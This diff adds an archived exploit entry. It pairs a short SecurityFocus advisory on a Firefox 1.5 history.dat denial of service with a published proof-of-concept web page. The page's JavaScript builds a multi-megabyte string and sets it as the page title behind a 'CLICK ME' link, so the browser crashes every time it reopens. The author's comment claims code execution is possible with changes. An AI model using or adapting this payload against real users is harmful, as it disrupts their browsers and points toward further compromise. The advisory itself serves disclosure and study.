@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/15773/info
+
+Mozilla Firefox is reportedly prone to a remote denial-of-service vulnerability.
+
+This issue presents itself when the browser handles a large entry in the 'history.dat' file. An attacker may trigger this issue by enticing a user to visit a malicious website and by supplying excessive data to be stored in the affected file.
+
+This may cause a denial-of-service condition.
+
+**UPDATE: Proof-of-concept exploit code has been published. The author of the code attributes the crash to a buffer-overflow condition. Symantec has not reproduced the alleged flaw. 
+
+<!-- Firefox 1.5 buffer overflow
+
+Basically firefox logs all kinda of URL data in it's history.dat file,
+this little script will set a really large topic and Firefox will then
+save that topic into it's history.dat.. The next time that firefox is
+opened, it will instantly crash due to a buffer overflow -- this will
+happen everytime until you manually delete the history.dat file -- which
+most users won't figure out.
+
+this proof of concept will only prevent someone from reopening
+their browser after being exploited. DoS if you will. however, code
+execution is possible with some modifcations.
+
+Tested with Firefox 1.5 on Windows XP SP2.
+
+ZIPLOCK <sickbeatz@gmail.com>
+
+-->
+<html><head><title>heh</title><script type="text/javascript">
+function ex() {
+	var buffer = "";
+	for (var i = 0; i < 5000; i++) {
+		buffer += "A";
+	}
+	var buffer2 = buffer;
+	for (i = 0; i < 500; i++) {
+		buffer2 += buffer;
+	}
+	document.title = buffer2;
+}
+</script></head><body>ZIPLOCK says <a href="javascript:ex();">CLICK ME
+</a></body></html>
